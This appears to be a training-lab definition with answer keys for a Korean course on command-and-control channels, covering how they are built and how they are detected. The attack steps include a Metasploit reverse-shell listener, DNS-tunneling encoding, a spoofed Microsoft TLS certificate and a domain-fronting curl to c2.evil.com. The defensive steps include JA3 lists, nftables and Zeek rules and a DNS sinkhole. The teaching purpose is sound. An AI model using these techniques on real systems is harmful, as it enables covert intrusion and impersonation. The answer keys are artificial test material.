@@ -1,0 +1,179 @@
+lab_id: "battle-adv-nonai-week03"
+title: "C2 채널 구축 — Command & Control 인프라"
+version: "non-ai"
+course: "battle-adv-nonai"
+week: 3
+description: "Command & Control(C2) 인프라의 구조와 통신 기법을 분석한다. DNS, HTTP, HTTPS, 암호화 채널 등 다양한 C2 프로토콜을 이해하고, 탐지 및 차단 방법을 실습한다."
+difficulty: "hard"
+duration_minutes: 150
+objectives:
+  - "C2 인프라의 구성 요소와 통신 구조를 이해한다"
+  - "DNS, HTTP, HTTPS 기반 C2 채널의 특성을 분석한다"
+  - "C2 트래픽의 네트워크 시그니처를 식별한다"
+  - "C2 채널 탐지 및 차단 기법을 실습한다"
+pass_threshold: 0.6
+steps:
+  - order: 1
+    instruction: "C2 프레임워크의 아키텍처를 분석하라. Metasploit의 handler 설정을 통해 C2 리스너의 기본 구조를 이해하라. multi/handler를 설정하고 대기 상태를 확인하라."
+    hint: "msfconsole -q -x 명령으로 handler를 자동 설정한다."
+    category: "recon"
+    points: 10
+    answer: "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 10.20.30.201; set LPORT 4444; show options; exit' 2>&1 | tail -20"
+    answer_detail: "C2 리스너는 공격자가 침투한 시스템으로부터의 역연결(reverse connection)을 수신한다. Metasploit의 multi/handler는 범용 리스너로, PAYLOAD 타입에 따라 다양한 C2 프로토콜을 지원한다. LHOST는 리스너 IP, LPORT는 수신 포트를 지정한다."
+    verify:
+      type: "output_contains"
+      expect: "LHOST"
+
+  - order: 2
+    instruction: "DNS 기반 C2 채널의 원리를 이해하기 위해 DNS 터널링을 시뮬레이션하라. 데이터를 DNS 쿼리의 서브도메인에 인코딩하여 전송하는 스크립트를 작성하라."
+    hint: "base64 인코딩 후 63바이트 단위로 분할하여 서브도메인으로 구성한다."
+    category: "exploit"
+    points: 10
+    answer: "cat > /tmp/dns_c2_sim.sh << 'SCRIPT'\n#!/bin/bash\n# DNS C2 Simulation - Encoding data in subdomain queries\nDATA=\"Sensitive_Data_Exfil_Test_2026\"\nENCODED=$(echo -n \"$DATA\" | base64 | tr '+/' '-_' | tr -d '=')\necho \"Original: $DATA\"\necho \"Encoded subdomain: ${ENCODED}.c2.test.local\"\necho \"DNS query would be: nslookup ${ENCODED}.c2.test.local\"\necho \"Chunk size: ${#ENCODED} bytes (max 63 per label)\"\nSCRIPT\nchmod +x /tmp/dns_c2_sim.sh && bash /tmp/dns_c2_sim.sh"
+    answer_detail: "DNS C2(T1071.004)는 DNS 쿼리/응답에 데이터를 은닉하여 통신한다. 서브도메인에 base64 인코딩 데이터를 삽입하면 DNS 서버를 경유하여 C2 서버로 전달된다. DNS는 대부분의 네트워크에서 허용되므로 방화벽 우회에 효과적이다."
+    verify:
+      type: "output_contains"
+      expect: "Encoded subdomain"
+
+  - order: 3
+    instruction: "HTTP 기반 C2 통신을 시뮬레이션하라. 정상 HTTP 트래픽으로 위장하는 C2 비컨(beacon)을 구현하라. 주기적으로 명령을 확인하고 결과를 전송하는 구조를 만들어라."
+    hint: "curl을 사용하여 C2 서버에 주기적으로 check-in하는 스크립트를 작성한다."
+    category: "exploit"
+    points: 10
+    answer: "cat > /tmp/http_c2_beacon.sh << 'SCRIPT'\n#!/bin/bash\n# HTTP C2 Beacon Simulation\nC2_SERVER=\"http://10.20.30.201:8080\"\nSLEEP_INTERVAL=30\nJITTER=10\nBEACON_ID=$(hostname)-$(id -u)\necho \"=== HTTP C2 Beacon Simulation ===\"\necho \"C2 Server: $C2_SERVER\"\necho \"Beacon ID: $BEACON_ID\"\necho \"Sleep: ${SLEEP_INTERVAL}s (+/- ${JITTER}s jitter)\"\necho \"Check-in URL: ${C2_SERVER}/api/beacon?id=${BEACON_ID}&type=checkin\"\necho \"Task fetch URL: ${C2_SERVER}/api/tasks?id=${BEACON_ID}\"\necho \"Result post URL: ${C2_SERVER}/api/results\"\necho \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\"\nSCRIPT\nbash /tmp/http_c2_beacon.sh"
+    answer_detail: "HTTP C2(T1071.001)는 정상 웹 트래픽으로 위장하여 탐지를 회피한다. 비컨은 주기적으로(sleep+jitter) C2 서버에 check-in하여 명령을 수신하고, 실행 결과를 POST로 전송한다. User-Agent를 정상 브라우저로 위장하고 jitter를 추가하여 패턴 탐지를 어렵게 만든다."
+    verify:
+      type: "output_contains"
+      expect: "HTTP C2 Beacon"
+
+  - order: 4
+    instruction: "HTTPS C2 통신을 위한 자체 서명 인증서를 생성하라. C2 서버에 사용할 TLS 인증서와 개인키를 생성하고, 정상 도메인으로 위장하라."
+    hint: "openssl req 명령으로 자체 서명 인증서를 생성하되, CN을 유명 서비스로 위장한다."
+    category: "exploit"
+    points: 10
+    answer: "openssl req -x509 -newkey rsa:2048 -keyout /tmp/c2_key.pem -out /tmp/c2_cert.pem -days 365 -nodes -subj '/CN=update.microsoft.com/O=Microsoft Corporation/C=US' 2>&1 && openssl x509 -in /tmp/c2_cert.pem -noout -subject -dates"
+    answer_detail: "HTTPS C2는 TLS 암호화로 트래픽 내용을 은닉한다. 자체 서명 인증서의 CN(Common Name)을 update.microsoft.com 같은 정상 도메인으로 위장하여 기본적인 검사를 통과시킨다. 하지만 인증서 체인 검증(CT 로그)으로 탐지 가능하다."
+    verify:
+      type: "output_contains"
+      expect: "update.microsoft.com"
+
+  - order: 5
+    instruction: "도메인 프론팅(Domain Fronting) 기법의 원리를 분석하라. CDN을 경유하여 C2 트래픽을 은닉하는 HTTP 요청 구조를 시뮬레이션하라."
+    hint: "Host 헤더와 SNI가 다른 HTTP 요청을 구성한다."
+    category: "exploit"
+    points: 10
+    answer: "cat > /tmp/domain_fronting_sim.txt << 'EOF'\n=== Domain Fronting Simulation ===\n\nNormal Request:\n  TLS SNI: cdn.cloudflare.com\n  Host Header: cdn.cloudflare.com\n\nDomain Fronted Request:\n  TLS SNI: cdn.cloudflare.com  (visible to network monitors)\n  Host Header: c2.evil.com     (hidden inside TLS, routed by CDN)\n\ncurl Simulation:\n  curl -H \"Host: c2.evil.com\" https://cdn.cloudflare.com/beacon\n\nDetection Points:\n  1. TLS SNI vs Host header mismatch\n  2. JA3/JA3S fingerprint anomaly\n  3. Unusual CDN traffic patterns\n  4. Certificate transparency logs\nEOF\ncat /tmp/domain_fronting_sim.txt"
+    answer_detail: "도메인 프론팅(T1090.004)은 CDN의 라우팅 특성을 악용한다. TLS 핸드셰이크의 SNI에는 정상 도메인을, HTTP Host 헤더에는 C2 도메인을 설정하면 네트워크 모니터링에서는 정상 CDN 트래픽으로 보이지만 실제로는 C2 서버로 라우팅된다."
+    verify:
+      type: "output_contains"
+      expect: "Domain Fronting"
+
+  - order: 6
+    instruction: "C2 트래픽의 네트워크 시그니처를 분석하라. tcpdump로 DNS 쿼리 패턴을 캡처하고, 비정상적인 DNS 트래픽(높은 빈도, 긴 서브도메인)을 식별하라."
+    hint: "tcpdump로 DNS 트래픽을 캡처하고, 쿼리 길이를 분석한다."
+    category: "defense"
+    points: 10
+    answer: "timeout 5 tcpdump -i any -nn port 53 -c 20 2>/dev/null | head -20; echo '---'; echo 'DNS C2 Detection Indicators:'; echo '1. Query length > 50 chars (normal avg: 15-25)'; echo '2. Query frequency > 10/min to same domain'; echo '3. TXT record queries (data exfil)'; echo '4. NXDOMAIN response ratio > 50%'"
+    answer_detail: "DNS C2 탐지의 핵심 지표: (1) 쿼리 도메인 길이 - 인코딩된 데이터 포함 시 비정상적으로 길다, (2) 쿼리 빈도 - 정상 DNS보다 훨씬 높은 빈도, (3) TXT 레코드 쿼리 - 대량 데이터 전송에 활용, (4) NXDOMAIN 비율 - 존재하지 않는 인코딩 도메인 다수."
+    verify:
+      type: "output_contains"
+      expect: "DNS C2 Detection"
+
+  - order: 7
+    instruction: "JA3 핑거프린트를 이용한 C2 탐지를 실습하라. JA3는 TLS 클라이언트의 핑거프린트로, 악성 C2 클라이언트를 식별하는 데 사용된다. 알려진 C2 프레임워크의 JA3 해시를 조사하라."
+    hint: "Cobalt Strike, Metasploit 등의 알려진 JA3 해시를 정리한다."
+    category: "defense"
+    points: 10
+    answer: "cat > /tmp/ja3_c2_signatures.txt << 'EOF'\n=== Known C2 Framework JA3 Fingerprints ===\n\nCobalt Strike:\n  JA3: 72a589da586844d7f0818ce684948eea\n  JA3: ae4edc6faf64d08308082ad26be60767\n\nMetasploit Meterpreter:\n  JA3: 5d65ea3fb1d4aa7d826733d2f2cbbb1d\n\nSilver C2:\n  JA3: cd08e31494f9531f0ab97c3e0c159e29\n\nPoshC2:\n  JA3: b9b12b0e28d5e8888faa6a0ae1a2e2e2\n\nDetection Strategy:\n  1. Collect JA3 from all TLS connections\n  2. Compare against known-bad JA3 database\n  3. Flag unknown JA3 from internal hosts\n  4. Correlate with threat intelligence feeds\nEOF\ncat /tmp/ja3_c2_signatures.txt"
+    answer_detail: "JA3(T1071.001 탐지)는 TLS Client Hello 패킷의 필드(TLS 버전, 암호 스위트, 확장 등)를 MD5 해시하여 클라이언트를 식별한다. 동일한 C2 프레임워크는 동일한 JA3 해시를 생성하므로, 알려진 C2의 JA3 블랙리스트로 탐지가 가능하다."
+    verify:
+      type: "output_contains"
+      expect: "JA3"
+
+  - order: 8
+    instruction: "nftables로 C2 통신을 차단하는 방화벽 규칙을 작성하라. 비표준 포트의 아웃바운드 TCP 연결, 비정상적인 DNS 쿼리, 알려진 C2 IP를 차단하라."
+    hint: "nft add rule 명령으로 체인에 규칙을 추가한다."
+    category: "defense"
+    points: 10
+    answer: "cat > /tmp/c2_block_rules.nft << 'EOF'\n#!/usr/sbin/nft -f\n# C2 Channel Blocking Rules\ntable inet c2_block {\n  set blocked_c2_ips {\n    type ipv4_addr\n    elements = { 198.51.100.1, 203.0.113.50 }\n  }\n\n  chain output {\n    type filter hook output priority 0; policy accept;\n    # Block known C2 IPs\n    ip daddr @blocked_c2_ips drop\n    # Block non-standard outbound ports (common C2 ports)\n    tcp dport { 4444, 5555, 8443, 9999 } log prefix \"C2_PORT_BLOCK: \" drop\n    # Rate-limit DNS queries (anti DNS tunneling)\n    udp dport 53 limit rate over 30/second log prefix \"DNS_FLOOD: \" drop\n    # Block large DNS queries (>512 bytes, possible tunneling)\n    udp dport 53 meta length > 512 log prefix \"DNS_TUNNEL: \" drop\n  }\n}\nEOF\ncat /tmp/c2_block_rules.nft"
+    answer_detail: "nftables로 C2 차단 규칙을 구현한다: (1) 알려진 C2 IP 블랙리스트(set), (2) 비표준 아웃바운드 포트 차단(4444 등), (3) DNS 쿼리 레이트 리밋(터널링 방지), (4) 대형 DNS 패킷 차단(512바이트 초과). log prefix로 차단 이벤트를 기록한다."
+    verify:
+      type: "output_contains"
+      expect: "c2_block"
+
+  - order: 9
+    instruction: "C2 비컨의 주기적 통신 패턴을 탐지하기 위한 통계 분석을 수행하라. 네트워크 연결 로그에서 주기적인 외부 연결 패턴(비컨 간격)을 찾는 스크립트를 작성하라."
+    hint: "연결 시간 간격의 표준편차가 낮으면 비컨 패턴일 가능성이 높다."
+    category: "analysis"
+    points: 10
+    answer: "cat > /tmp/beacon_detector.sh << 'SCRIPT'\n#!/bin/bash\n# Beacon Detection via Connection Interval Analysis\necho \"=== C2 Beacon Pattern Detector ===\"\necho \"Method: Analyze connection intervals for periodicity\"\necho \"\"\necho \"Sample intervals (seconds): 30 31 29 30 32 28 31 30 29 31\"\necho \"\"\n# Calculate stats\npython3 -c \"\nimport statistics\nintervals = [30, 31, 29, 30, 32, 28, 31, 30, 29, 31]\nmean = statistics.mean(intervals)\nstdev = statistics.stdev(intervals)\ncv = stdev / mean * 100\nprint(f'Mean interval: {mean:.1f}s')\nprint(f'Std deviation: {stdev:.2f}s')\nprint(f'Coefficient of variation: {cv:.1f}%')\nprint(f'Beacon likelihood: {\"HIGH\" if cv < 15 else \"LOW\"}')\nprint(f'Estimated sleep: {mean:.0f}s with jitter +/-{stdev:.0f}s')\n\"\nSCRIPT\nbash /tmp/beacon_detector.sh"
+    answer_detail: "C2 비컨은 일정한 간격(sleep)으로 check-in하며, jitter를 추가해도 통계적 주기성이 남는다. 연결 간격의 변동계수(CV=표준편차/평균×100)가 15% 미만이면 비컨 패턴일 가능성이 높다. RITA(Real Intelligence Threat Analytics)와 같은 도구가 이 방식을 사용한다."
+    verify:
+      type: "output_contains"
+      expect: "Beacon likelihood"
+
+  - order: 10
+    instruction: "C2 프레임워크별 네트워크 시그니처를 비교 분석하라. Cobalt Strike, Metasploit, Sliver의 통신 특성을 정리하라."
+    hint: "각 프레임워크의 기본 통신 프로토콜, 포트, 암호화 방식, 탐지 방법을 비교한다."
+    category: "analysis"
+    points: 10
+    answer: "cat > /tmp/c2_framework_comparison.txt << 'EOF'\n=== C2 Framework Network Signature Comparison ===\n\n| Feature | Cobalt Strike | Metasploit | Sliver |\n|---------|--------------|------------|--------|\n| Protocol | HTTP/S, DNS, SMB | TCP, HTTP/S | mTLS, HTTP/S, DNS, WG |\n| Default Port | 443/80/53 | 4444 | 443/31337 |\n| Encryption | AES-256 | XOR/AES | mTLS (mutual TLS) |\n| Beacon Pattern | Configurable sleep+jitter | Fixed interval | Configurable |\n| JA3 Known | Yes (multiple) | Yes | Fewer known |\n| Malleable C2 | Yes (profile) | Limited | Configurable |\n| DNS Tunnel | Supported | Limited | Supported |\n| Detection Difficulty | Medium-High | Low-Medium | High |\n\nKey Detection Methods:\n- Cobalt Strike: Default profile detection, JA3, named pipe \\\\msagent_*\n- Metasploit: Default port 4444, XOR patterns, stage URI /random_uri\n- Sliver: mTLS certificate anomaly, implant binary entropy\nEOF\ncat /tmp/c2_framework_comparison.txt"
+    answer_detail: "각 C2 프레임워크는 고유한 네트워크 시그니처를 가진다. Cobalt Strike는 Malleable C2 프로파일로 트래픽을 커스터마이즈할 수 있어 탐지가 어렵고, Metasploit은 기본 설정 시 탐지가 쉽다. Sliver는 mTLS를 기본 사용하여 트래픽 암호화가 강력하다."
+    verify:
+      type: "output_contains"
+      expect: "Framework Network Signature"
+
+  - order: 11
+    instruction: "Zeek(Bro) IDS를 사용한 C2 탐지 규칙을 작성하라. HTTP 비컨 패턴과 DNS 터널링을 탐지하는 Zeek 스크립트를 작성하라."
+    hint: "Zeek의 event 프레임워크를 사용하여 HTTP 연결과 DNS 쿼리를 분석한다."
+    category: "defense"
+    points: 10
+    answer: "cat > /tmp/c2_detection.zeek << 'EOF'\n# Zeek Script: C2 Channel Detection\n# DNS Tunneling Detection\nevent dns_request(c: connection, msg: dns_msg, query: string, qtype: count, qclass: count) {\n  if (|query| > 50) {\n    NOTICE([$note=Weird::Activity,\n            $msg=fmt(\"Long DNS query (possible tunneling): %s (%d chars)\", query, |query|),\n            $conn=c]);\n  }\n}\n\n# HTTP Beacon Detection (simplified)\nglobal http_conn_count: table[addr] of count = {} &default=0;\nevent http_request(c: connection, method: string, original_URI: string, unescaped_URI: string, version: string) {\n  local dst = c$id$resp_h;\n  http_conn_count[dst] += 1;\n  if (http_conn_count[dst] > 100) {\n    NOTICE([$note=Weird::Activity,\n            $msg=fmt(\"High frequency HTTP connections to %s (possible beacon)\", dst),\n            $conn=c]);\n  }\n}\nEOF\ncat /tmp/c2_detection.zeek"
+    answer_detail: "Zeek(구 Bro) IDS는 네트워크 프로토콜을 심층 분석하여 C2 통신을 탐지한다. DNS 터널링은 비정상적으로 긴 쿼리(50자 초과)로 탐지하고, HTTP 비컨은 동일 서버로의 고빈도 연결로 탐지한다. Zeek의 이벤트 기반 스크립팅은 커스텀 탐지 로직 구현에 강력하다."
+    verify:
+      type: "output_contains"
+      expect: "dns_request"
+
+  - order: 12
+    instruction: "C2 채널의 암호화 통신을 분석하라. SSL/TLS 인증서 메타데이터를 검사하여 자체 서명 인증서나 비정상 인증서를 식별하라."
+    hint: "openssl s_client로 인증서를 가져오고 발급자, 유효기간, SAN을 확인한다."
+    category: "analysis"
+    points: 10
+    answer: "echo | openssl s_client -connect 10.20.30.80:443 -servername 10.20.30.80 2>/dev/null | openssl x509 -noout -issuer -subject -dates -fingerprint 2>/dev/null; echo '---'; echo 'C2 Certificate Red Flags:'; echo '1. Self-signed (Issuer == Subject)'; echo '2. Recently created (< 30 days)'; echo '3. Long validity (> 1 year)'; echo '4. Generic CN (localhost, *.com)'; echo '5. Missing SAN extension'"
+    answer_detail: "C2 서버의 TLS 인증서는 종종 자체 서명이거나 비정상적인 메타데이터를 가진다. 자체 서명(Issuer=Subject), 최근 생성, 비정상적으로 긴 유효기간, 일반적인 CN, SAN 미설정 등이 Red Flag이다. Certificate Transparency 로그와 대조하면 추가 검증이 가능하다."
+    verify:
+      type: "output_contains"
+      expect: "Red Flags"
+
+  - order: 13
+    instruction: "DNS Sinkhole을 구성하여 C2 도메인을 차단하라. dnsmasq를 이용하여 알려진 악성 도메인을 127.0.0.1로 리다이렉트하는 설정을 작성하라."
+    hint: "dnsmasq의 address 옵션으로 도메인을 차단한다."
+    category: "defense"
+    points: 10
+    answer: "cat > /tmp/dns_sinkhole.conf << 'EOF'\n# DNS Sinkhole Configuration for C2 Domain Blocking\n# Add to /etc/dnsmasq.d/c2_sinkhole.conf\n\n# Known C2 domains - redirect to sinkhole\naddress=/evil-c2.com/127.0.0.1\naddress=/malware-update.net/127.0.0.1\naddress=/beacon-server.org/127.0.0.1\n\n# Block entire TLD commonly used by C2\naddress=/.tk/127.0.0.1\naddress=/.ml/127.0.0.1\n\n# Log all queries for analysis\nlog-queries\nlog-facility=/var/log/dnsmasq-sinkhole.log\n\n# Rate limit DNS queries per client\ndns-forward-max=150\n\n# Sinkhole response page\naddress=/sinkhole.local/10.20.30.201\nEOF\ncat /tmp/dns_sinkhole.conf"
+    answer_detail: "DNS Sinkhole은 악성 도메인의 DNS 응답을 조작하여 C2 통신을 차단한다. dnsmasq의 address 옵션으로 특정 도메인을 127.0.0.1로 리다이렉트하면, 감염된 호스트의 C2 연결이 실패한다. 로그를 활성화하여 차단된 쿼리를 분석하면 감염 호스트를 식별할 수 있다."
+    verify:
+      type: "output_contains"
+      expect: "sinkhole"
+
+  - order: 14
+    instruction: "C2 인프라 TTP 분석 보고서를 작성하라. 이번 실습에서 다룬 C2 기법, 탐지 방법, 차단 전략을 MITRE ATT&CK 매핑과 함께 정리하라."
+    hint: "T1071(Application Layer Protocol), T1090(Proxy), T1573(Encrypted Channel) 등을 매핑한다."
+    category: "analysis"
+    points: 5
+    answer: "cat > /tmp/c2_ttp_report.txt << 'EOF'\n=== C2 Infrastructure TTP Analysis Report ===\n\n1. C2 Techniques Analyzed:\n   T1071.001 - Web Protocols (HTTP/S beacon)\n   T1071.004 - DNS (DNS tunneling)\n   T1090.004 - Domain Fronting\n   T1573.001 - Encrypted Channel: Symmetric (AES)\n   T1573.002 - Encrypted Channel: Asymmetric (TLS)\n\n2. Detection Methods:\n   - Network: JA3 fingerprint, beacon interval analysis, DNS anomaly\n   - Endpoint: Process-network correlation, certificate validation\n   - SIEM: Correlation rules for C2 indicators\n\n3. Blocking Strategies:\n   - nftables: Port/IP blocking, DNS rate limiting\n   - DNS Sinkhole: Domain-level blocking\n   - TLS Inspection: Certificate anomaly detection\n   - Zeek: Protocol-level deep inspection\n\n4. Recommendations:\n   - Deploy DNS sinkhole with threat intel feeds\n   - Implement JA3 monitoring on all egress points\n   - Enable beacon detection in SIEM (interval analysis)\n   - TLS inspection for non-pinned connections\nEOF\ncat /tmp/c2_ttp_report.txt"
+    answer_detail: "C2 분석 보고서는 사용된 기법을 MITRE ATT&CK에 매핑하고, 각 기법의 탐지 방법과 차단 전략을 구체적으로 기술한다. 네트워크, 엔드포인트, SIEM 레벨의 다층 탐지와 방화벽, DNS, TLS 레벨의 다층 차단을 결합한 Defense-in-Depth가 핵심이다."
+    verify:
+      type: "output_contains"
+      expect: "C2 Infrastructure TTP"
+
+  - order: 15
+    instruction: "이번 주 실습에서 구축한 C2 시뮬레이션 환경을 완전히 정리하라. 생성된 인증서, 스크립트, 설정 파일을 모두 삭제하고, 열린 포트나 프로세스가 없는지 확인하라."
+    hint: "rm으로 임시 파일을 삭제하고, ss로 열린 포트를 확인한다."
+    category: "response"
+    points: 15
+    answer: "rm -f /tmp/c2_*.pem /tmp/c2_*.sh /tmp/c2_*.txt /tmp/c2_*.zeek /tmp/c2_*.nft /tmp/c2_*.conf /tmp/dns_*.sh /tmp/dns_*.conf /tmp/http_*.sh /tmp/beacon_*.sh /tmp/domain_*.txt /tmp/ja3_*.txt 2>/dev/null; echo 'C2 lab files cleaned'; ss -tlnp | grep -E '4444|8080|8443' || echo 'No C2 ports open - environment clean'"
+    answer_detail: "실습 환경 정리는 보안 실습의 필수 단계이다. C2 시뮬레이션에서 생성된 인증서, 스크립트, 설정 파일을 모두 삭제하고, C2 관련 포트(4444, 8080, 8443)가 열려 있지 않은지 확인한다. 실제 레드팀 작전에서도 작전 종료 후 모든 인프라를 해체하는 것이 표준 절차이다."
+    verify:
+      type: "output_contains"
+      expect: "clean"
